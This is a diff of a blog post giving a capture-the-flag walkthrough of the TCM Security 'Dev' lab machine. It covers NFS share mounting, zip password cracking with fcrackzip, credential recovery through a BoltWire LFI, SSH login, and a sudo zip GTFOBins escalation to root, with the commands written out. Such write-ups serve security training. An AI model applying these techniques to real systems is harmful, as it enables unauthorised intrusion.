@@ -1,10 +1,10 @@
 ---
-title: "Dev Machine (TCM Security) — Step-by-Step Walkthrough"
-date: "2025-11-30"
+title: 'Dev Machine (TCM Security) — Step-by-Step Walkthrough'
+date: '2025-11-30'
 draft: false
-tags: ["linux", "lfi", "privilege-escalation", "boltwire"]
-summary: "Compromise of a Linux machine via NFS enumeration, zip password cracking, and a BoltWire LFI vulnerability to obtain SSH credentials, followed by privilege escalation using a sudo zip GTFOBins exploit."
-images: ["/static/images/dev/preview.png"]
+tags: ['linux', 'Machine', 'lfi', 'privilege-escalation', 'boltwire']
+summary: 'Compromise of a Linux machine via NFS enumeration, zip password cracking, and a BoltWire LFI vulnerability to obtain SSH credentials, followed by privilege escalation using a sudo zip GTFOBins exploit.'
+images: ['/static/images/dev/preview.png']
 ---
 
 # Lab Setup:
@@ -13,11 +13,9 @@ Both the target machine (DEV) and the attacker machine (Kali Linux) are configur
 
 ## Kali Linux
 
-
 ![dev](/static/images/dev/image.png)
 
 ## Dev
-
 
 ![dev](/static/images/dev/image%201.png)
 
@@ -49,25 +47,16 @@ rtt min/avg/max/mdev = 1.340/2.231/3.666/1.024 ms
 
 ![dev-namp](/static/images/dev/nmap.png)
 
-
 The target machine has the following important ports open:
 
 - 'Port 22 (SSH)'
-    
-    SSH service is running.
-    
+  SSH service is running.
 - 'Port 80 (HTTP)'
-    
-    Apache 2.4 web server is running and serving a *Bolt installation error* page.
-    
+  Apache 2.4 web server is running and serving a _Bolt installation error_ page.
 - 'Port 2049 (NFS)'
-    
-    NFS (Network File Share) service is active.
-    
+  NFS (Network File Share) service is active.
 - 'Port 8080 (HTTP)'
-    
-    Hosting a PHP info page.
-    
+  Hosting a PHP info page.
 
 # Port 2049
 
@@ -85,8 +74,8 @@ There is an NFS directory being shared, so to access its contents, I first creat
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ sudo mkdir /mnt/dev
-[sudo] password for kali: 
-                                                                              
+[sudo] password for kali:
+
 ┌──(kali㉿kali)-[~]
 └─$ sudo mount -t nfs 10.0.2.155:/srv/nfs /mnt/dev
 ```
@@ -105,17 +94,17 @@ To recover the password and extract the contents, I used **`fcrackzip`** to pe
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/dev]
-└─$ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip 
+└─$ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
 found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
 found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)
 
 PASSWORD FOUND!!!!: pw == java101
 ```
 
--v → verbosity 
--u → unzip 
+-v → verbosity
+-u → unzip
 -D → dictionary attack
--p → attack against a file 
+-p → attack against a file
 
 The attack was successful, and the password was revealed as: **`java101`**.
 
@@ -123,7 +112,7 @@ I then unzipped the file and viewed its contents. The **`todo.txt`** file cont
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/dev]
-└─$ cat todo.txt 
+└─$ cat todo.txt
 - Figure out how to install the main website properly, the config file seems correct...
 - Update development website
 - Keep coding in Java because it's awesome
@@ -171,7 +160,7 @@ Finished
 
 it shows that the database and the config directory is accessible openly and these directory have confidential information in it.
 
-I downloaded the `config.yml` file and it had a pair of `username and password` 
+I downloaded the `config.yml` file and it had a pair of `username and password`
 
 ![dev](/static/images/dev/image%205.png)
 
@@ -224,7 +213,6 @@ From this output, I identified a user named jeanpaul on the system.
 
 Now that I know the username '(jeanpaul)' and have the 'id_rsa' private key, I’ll attempt to establish an SSH connection to the target.
 
-
 ## Exploitation:
 
 ```bash
@@ -235,7 +223,7 @@ ED25519 key fingerprint is SHA256:NHMY4yX3pvvY0+B19v9tKZ+FdH9JOewJJKnKy2B0tW8.
 This key is not known by any other names.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '10.0.2.155' (ED25519) to the list of known hosts.
-Enter passphrase for key 'id_rsa': 
+Enter passphrase for key 'id_rsa':
 Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -245,12 +233,12 @@ individual files in /usr/share/doc/*/copyright.
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 Last login: Wed Jun  2 05:25:21 2021 from 192.168.10.31
-jeanpaul@dev:~$ 
+jeanpaul@dev:~$
 ```
 
-The passphrase for the `id_rsa` key was **`I_love_java`** which I previously found in the **`config.yml file`** 
+The passphrase for the `id_rsa` key was **`I_love_java`** which I previously found in the **`config.yml file`**
 
-After logging in, the first step was to check which commands the user can run with elevated privileges. 
+After logging in, the first step was to check which commands the user can run with elevated privileges.
 
 ```bash
 jeanpaul@dev:~$ sudo -l
@@ -258,14 +246,12 @@ Matching Defaults entries for jeanpaul on dev:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User jeanpaul may run the following commands on dev:
-    (root) NOPASSWD: /usr/bin/zip 
+    (root) NOPASSWD: /usr/bin/zip
 ```
 
 The user has permission to run the zip command with elevated privileges, so I checked https://gtfobins.github.io/ for a privilege‑escalation method using this command.
 
 ![dev](/static/images/dev/image%209.png)
-
- 
 
 ```bash
 jeanpaul@dev:~$ TF=$(mktemp -u)
@@ -273,20 +259,20 @@ jeanpaul@dev:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
   adding: etc/hosts (deflated 31%)
 # id
 uid=0(root) gid=0(root) groups=0(root)
-# 
+#
 ```
 
-These commands worked, and I successfully gained root access. 
+These commands worked, and I successfully gained root access.
 
 ## Flag
 
 ```bash
-# cd /root	
+# cd /root
 # ls
 flag.txt
 # cat flag.txt
 Congratz on rooting this box !
-# 
+#
 ```
 
 Flag captured. System owned. 🎯
